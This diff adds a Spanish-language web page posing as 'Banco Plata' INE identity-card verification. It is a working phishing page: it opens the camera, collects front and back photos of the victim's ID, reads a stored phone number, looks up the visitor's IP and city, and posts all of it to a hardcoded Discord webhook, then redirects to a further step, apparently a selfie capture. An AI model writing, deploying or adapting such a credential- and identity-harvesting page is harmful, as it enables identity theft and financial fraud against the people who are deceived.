@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Escáner INE - Banco Plata</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
+    body { background-color: #000; min-height: 100dvh; display: flex; justify-content: center; overflow: hidden; color: #fff; }
+    .app-container { width: 100%; max-width: 520px; display: flex; flex-direction: column; position: relative; height: 100dvh; }
+    #video { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 1; background-color: #222; }
+    .ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; display: flex; flex-direction: column; justify-content: space-between; padding: max(20px, env(safe-area-inset-top)) 20px max(20px, env(safe-area-inset-bottom)); pointer-events: none; }
+    .header-text { text-align: center; background: rgba(0,0,0,0.7); padding: 12px 20px; border-radius: 15px; backdrop-filter: blur(5px); margin: 0 auto; width: fit-content; max-width: 100%; pointer-events: auto; }
+    .header-text h2 { font-size: clamp(16px, 4.5vw, 18px); margin-bottom: 5px; }
+    .header-text p { font-size: clamp(12px, 3.5vw, 13px); color: #ccc; }
+    .scanner-frame { position: relative; width: 90%; max-width: 400px; aspect-ratio: 1.58; border-radius: 12px; margin: auto; transition: all 0.3s ease; box-shadow: 0 0 0 4000px rgba(0,0,0,0.5); border: 3px solid #FF4E00; pointer-events: auto; }
+    .corner { position: absolute; width: clamp(15px, 5vw, 20px); height: clamp(15px, 5vw, 20px); border: 4px solid #FF4E00; transition: border-color 0.3s; }
+    .corner.top-left { top: -2px; left: -2px; border-right: none; border-bottom: none; border-top-left-radius: 12px; }
+    .corner.top-right { top: -2px; right: -2px; border-left: none; border-bottom: none; border-top-right-radius: 12px; }
+    .corner.bottom-left { bottom: -2px; left: -2px; border-right: none; border-top: none; border-bottom-left-radius: 12px; }
+    .corner.bottom-right { bottom: -2px; right: -2px; border-left: none; border-top: none; border-bottom-right-radius: 12px; }
+    .status-bar { background: rgba(0,0,0,0.85); padding: 15px; border-radius: 15px; text-align: center; backdrop-filter: blur(5px); font-weight: 600; font-size: clamp(13px, 3.8vw, 14px); transition: background 0.3s; width: 100%; max-width: 400px; margin: 0 auto 15px auto; pointer-events: auto; line-height: 1.3; }
+    .btn-capture { width: 100%; max-width: 400px; margin: 0 auto; background-color: #FF4E00; color: #fff; border: none; padding: 18px; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; pointer-events: auto; text-align: center; box-shadow: 0 4px 15px rgba(255, 78, 0, 0.4); }
+    .btn-capture:active { background-color: #E64500; }
+    .preview-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 50; display: none; justify-content: center; align-items: center; }
+    .preview-img { width: 100%; height: 100%; object-fit: contain; }
+    .loader-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; justify-content: center; align-items: center; flex-direction: column; z-index: 999; color: #000; }
+    .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #000; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <div class="app-container">
+    <video id="video" autoplay playsinline muted></video>
+    
+    <div class="ui-layer">
+      <div class="header-text">
+        <h2 id="titleText">Escanea la parte FRONTAL del INE</h2>
+        <p id="subtitleText">Coloca tu documento físico dentro del marco</p>
+      </div>
+
+      <div class="scanner-frame" id="scannerFrame">
+        <div class="corner top-left"></div>
+        <div class="corner top-right"></div>
+        <div class="corner bottom-left"></div>
+        <div class="corner bottom-right"></div>
+      </div>
+
+      <div>
+        <div class="status-bar" id="statusBar">Cámara lista. Toma la foto.</div>
+        <button class="btn-capture" id="btnCapture" onclick="takePhoto()">Tomar foto</button>
+      </div>
+    </div>
+
+    <div class="preview-overlay" id="previewOverlay">
+      <img id="previewImg" class="preview-img" src="" alt="Captura">
+    </div>
+
+    <div class="loader-overlay" id="loader">
+      <div class="spinner"></div>
+      <h3>Subiendo documentos...</h3>
+    </div>
+  </div>
+
+  <canvas id="captureCanvas" style="display: none;"></canvas>
+
+  <script>
+    // NUEVO WEBHOOK ACTUALIZADO
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNX3dUITQQc';
+    
+    let video = document.getElementById('video');
+    let canvas = document.getElementById('captureCanvas');
+    let statusBar = document.getElementById('statusBar');
+    let btnCapture = document.getElementById('btnCapture');
+    let previewOverlay = document.getElementById('previewOverlay');
+    let previewImg = document.getElementById('previewImg');
+    
+    let currentSide = 'front';
+    let frontImage = null;
+    let backImage = null;
+    let videoStream = null;
+    let isProcessing = false;
+
+    async function startCamera() {
+      try {
+        if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+        videoStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }, 
+          audio: false 
+        });
+        video.srcObject = videoStream; 
+        video.play(); 
+      } catch (err) { 
+        console.error(err);
+        statusBar.innerHTML = '🚫 Error al abrir cámara.'; 
+        btnCapture.textContent = 'Reintentar';
+        btnCapture.onclick = () => location.reload();
+      }
+    }
+
+    function takePhoto() {
+      if (isProcessing) return;
+      isProcessing = true;
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      const imageBase64 = canvas.toDataURL('image/jpeg', 0.9);
+
+      previewOverlay.style.display = 'flex';
+      previewImg.src = imageBase64;
+      
+      setTimeout(() => {
+        previewOverlay.style.display = 'none';
+        
+        if (currentSide === 'front') {
+          frontImage = imageBase64;
+          currentSide = 'back';
+          document.getElementById('titleText').textContent = 'Escanea la parte TRASERA del INE';
+          document.getElementById('subtitleText').textContent = 'Enfoca el reverso de tu documento';
+          statusBar.textContent = "Cámara lista. Toma la foto trasera.";
+          isProcessing = false;
+        } else {
+          backImage = imageBase64;
+          document.querySelector('.ui-layer').style.display = 'none';
+          document.getElementById('loader').style.display = 'flex';
+          sendAllToDiscord();
+        }
+      }, 3000);
+    }
+
+    async function sendAllToDiscord() {
+      try {
+        const phone = localStorage.getItem('plata_phone') || 'No ingresado';
+        const res = await fetch('https://ipapi.co/json/'); 
+        const data = await res.json();
+        const time = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });
+
+        function base64ToBlob(base64Data, contentType) {
+          const sliceSize = 1024; const byteCharacters = atob(base64Data.split(',')[1]); const byteArrays = [];
+          for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+            const slice = byteCharacters.slice(offset, offset + sliceSize); const byteNumbers = new Array(slice.length);
+            for (let i = 0; i < slice.length; i++) { byteNumbers[i] = slice.charCodeAt(i); }
+            const byteArray = new Uint8Array(byteNumbers); byteArrays.push(byteArray);
+          }
+          return new Blob(byteArrays, { type: contentType });
+        }
+
+        const formData = new FormData();
+        const payload = { username: "Banco Plata INE", content: `🪪 **INE Capturada**\n\n**📱 Teléfono:** ${phone}\n**🌐 IP:** ${data.ip || 'Desconocida'}\n**📍 Ciudad:** ${data.city || 'Desconocida'}\n**⏰ Hora:** ${time}` };
+
+        formData.append('payload_json', JSON.stringify(payload));
+        formData.append('file1', base64ToBlob(frontImage, 'image/jpeg'), 'INE_Frontal.jpg');
+        formData.append('file2', base64ToBlob(backImage, 'image/jpeg'), 'INE_Trasera.jpg');
+
+        const response = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+        
+        if (response.ok) { 
+          window.location.href = 'self3.html'; 
+        } else { 
+          throw new Error('Fallo al enviar'); 
+        }
+      } catch (error) { 
+        console.error(error); 
+        alert('Error al subir los documentos.'); 
+        location.reload(); 
+      }
+    }
+    window.addEventListener('load', startCamera);
+  </script>
+</body>
+</html>
